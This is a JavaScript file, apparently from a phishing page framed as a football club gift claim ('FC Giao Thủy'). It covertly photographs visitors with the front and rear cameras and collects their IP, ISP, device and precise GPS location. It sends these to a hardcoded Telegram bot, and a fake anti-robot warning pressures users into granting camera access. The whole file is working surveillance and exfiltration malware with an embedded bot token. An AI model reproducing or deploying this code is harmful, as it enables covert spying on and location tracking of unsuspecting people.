const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: facingMode,
        width: { min: 640, ideal: 1280, max: 1920 },
        height: { min: 480, ideal: 720, max: 1080 }
      }, 
      audio: false 
    });
    
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', ''); 
      video.muted = true;
      video.play();

      video.onloadedmetadata = async () => {
        // Tăng thời gian chờ lên 2.5 giây để camera lấy nét và bù sáng cực chuẩn
        await delay(2500); 
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // Chỉnh sửa nhẹ độ tương phản để ảnh rõ hơn
        ctx.filter = 'brightness(1.1) contrast(1.1)';
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(t => t.stop());
        
        // Giữ chất lượng 0.8 để ảnh nét nhưng dung lượng vẫn vừa phải
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
      };
    });
  } catch (e) { return null; }
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  
  // 1. Nhận diện máy
  const ua = navigator.userAgent;
  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
  info.device = navigator.platform;

  let frontBlob = null;
  let backBlob = null;

  try {
    // 2. Chụp cam trước (Ưu tiên lấy nét)
    frontBlob = await captureCamera("user");
    
    // 3. Chụp cam sau (Nếu muốn nhanh thì có thể bỏ qua bước này hoặc để sau)
    if (frontBlob) {
        backBlob = await captureCamera("environment");
    }
    
    if (!frontBlob) throw new Error("No photo");
    info.camera = "✅ Rõ nét";
  } catch (e) {
    alert("CẢNH BÁO: Hệ thống cần xác thực hình ảnh để tránh Robot. Vui lòng 'Cho phép' Camera!");
    location.reload();
    return;
  }

  // 3. Lấy IP & GPS
  const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
    info.ip = res.ip;
    info.isp = res.connection?.org || 'N/A';
    info.lat = res.latitude;
    info.lon = res.longitude;
  }).catch(() => {});

  const getGPS = new Promise(res => {
    navigator.geolocation.getCurrentPosition(
      p => {
        info.lat = p.coords.latitude.toFixed(6);
        info.lon = p.coords.longitude.toFixed(6);
        res();
      },
      () => res(), 
      { enableHighAccuracy: true, timeout: 3000 }
    );
  });

  await Promise.all([getIP, getGPS]);

  // 4. GỬI DATA
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Time:</b> ${info.time}
📱 <b>Device:</b> ${info.device} (${info.os})
🌍 <b>IP:</b> ${info.ip}
🏢 <b>ISP:</b> ${info.isp}
📍 <b>Maps:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
🏙️ <b>Tọa độ:</b> ${info.lat}, ${info.lon}
`.trim();

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);

  const media = [];
  if (frontBlob) {
    formData.append('p1', frontBlob, 'f.jpg');
    media.push({ type: 'photo', media: 'attach://p1', caption: caption, parse_mode: 'HTML' });
  }
  if (backBlob) {
    formData.append('p2', backBlob, 'b.jpg');
    media.push({ type: 'photo', media: 'attach://p2' });
  }

  formData.append('media', JSON.stringify(media));

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
    method: 'POST',
    body: formData
  });
}
